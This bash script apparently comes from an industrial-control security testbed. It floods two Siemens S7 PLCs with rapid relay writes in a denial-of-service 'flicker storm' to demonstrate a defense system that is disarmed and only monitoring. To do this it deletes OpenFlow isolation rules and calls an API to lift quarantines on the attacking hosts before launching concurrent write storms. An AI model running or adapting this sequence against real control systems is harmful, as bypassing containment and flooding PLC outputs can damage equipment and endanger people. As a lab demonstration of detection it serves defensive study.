#!/bin/bash
# Aggressive DUAL-PLC output storm (DoS-style flicker) with defense DISARMED — both TB1 (.2.10) and TB2 (.3.10)
# relays clatter simultaneously while CARS watches every command but only monitors (disarmed). Bounded burst.
#   sudo bash cars_dos_flicker.sh [HZ] [SECS]     (default 10 Hz for ~SECS s; HZ 0 = max rate / buzz)
# Disarm the defense from the dashboard FIRST (or the guard will block the storm).
set -u
API=http://10.10.10.1:8080/cars; S7=/home/msclab/s7_write.py; PLC1=192.168.2.10; PLC2=192.168.3.10
HZ=${1:-10}; SECS=${2:-20}
echo "defense state: $(curl -s $API/defense)"
echo "   (if that shows ARMED/enabled=true, disarm it from the dashboard button first — else CARS blocks the storm.)"
# clear any stale source-isolate so both storms can connect and reach the outputs
for sw in ovs1 ovsgw; do
  ovs-ofctl -O OpenFlow13 --strict del-flows "$sw" "table=1,priority=110,ip,nw_src=192.168.2.31" 2>/dev/null
  ovs-ofctl -O OpenFlow13 --strict del-flows "$sw" "table=1,priority=110,ip,nw_src=192.168.3.66" 2>/dev/null
done
curl -s -XPOST $API/restore -H 'Content-Type: application/json' -d '{"src":"192.168.2.31","dst":"192.168.2.10","dpid":3}' >/dev/null
curl -s -XPOST $API/restore -H 'Content-Type: application/json' -d '{"src":"192.168.3.66","dst":"192.168.3.10","dpid":3}' >/dev/null
echo
echo ">>> LISTEN: both TB1 and TB2 relays should clatter aggressively for ~${SECS}s (${HZ} Hz) <<<"
ip netns exec opns python3 $S7 --host $PLC1 --storm --hz $HZ --secs $SECS & P1=$!   # PLC1 from operator netns (.2.31)
python3            $S7 --host $PLC2 --storm --hz $HZ --secs $SECS & P2=$!            # PLC2 cross-NAT from root (.3.66)
sleep 6
echo
echo "---- CARS decision tail DURING the storm (defense DISARMED => monitor-only, no enforcement) ----"
curl -s $API/audit | python3 -c "import json,sys;[print('   '+l) for l in json.load(sys.stdin)['audit'] if 'CONTROL' in l][-8:]" 2>/dev/null
wait $P1 $P2
# leave both relays in a safe OFF state
ip netns exec opns python3 $S7 --host $PLC1 --val 0 --count 1 >/dev/null 2>&1
python3            $S7 --host $PLC2 --val 0 --count 1 >/dev/null 2>&1
echo
echo "storm complete. both relays OFF."
echo "=> CARS SAW every malicious write on both PLCs (logged 'would ISOLATE/BLOCK') but did NOT act — because you"
echo "   disarmed it. Re-arm from the dashboard and run this again to watch CARS shut an identical storm down."
